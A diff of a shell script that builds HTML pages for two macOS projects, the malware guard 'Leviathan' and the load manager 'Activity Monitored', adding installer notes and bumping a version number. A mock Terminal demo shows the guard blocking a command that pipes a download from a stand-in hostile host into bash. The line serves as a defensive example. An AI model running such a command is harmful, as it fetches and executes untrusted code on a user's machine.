@@ -19,7 +19,7 @@ cat > leviathan/index.html <<EOF
 $H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
 <nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v2.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div><p class="note">Open the zip, then right-click <b>Install Leviathan.command</b> and choose Open. It needs <a href="https://brew.sh">Homebrew</a> and your Mac password. The shield appears in your menu bar.</p></div>
 <figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
 <b>Leviathan stopped this command.</b>
 It downloads a program and runs it
@@ -46,7 +46,7 @@ straight away. Scam pages ask for this.
 <li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
 <li><span class="k">2</span><div><b>Open Terminal</b><span>Press Cmd and Space, type Terminal, press Return.</span></div></li>
 <li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into the window, and press Return. Enter your Mac password when asked; the website filter needs it once.</span></div></li>
-</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v2.0.0.tar.gz | tar xz &amp;&amp; bash leviathan-2.0.0/install.sh</code></pre></div></section>
+</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v2.0.4.tar.gz | tar xz &amp;&amp; bash leviathan-2.0.4/install.sh</code></pre></div></section>
 $FOOT
 EOF
 
@@ -54,7 +54,7 @@ cat > activity-monitored/index.html <<EOF
 $H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
 <nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div><p class="note">Open the zip, then right-click <b>Install Activity Monitored.command</b> and choose Open. It runs in the background from then on; type <code>monitored</code> in Terminal to see what it did.</p></div>
 <figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
 <b>Busy. Asking 3 background programs to wait.</b>
   backup        lowered
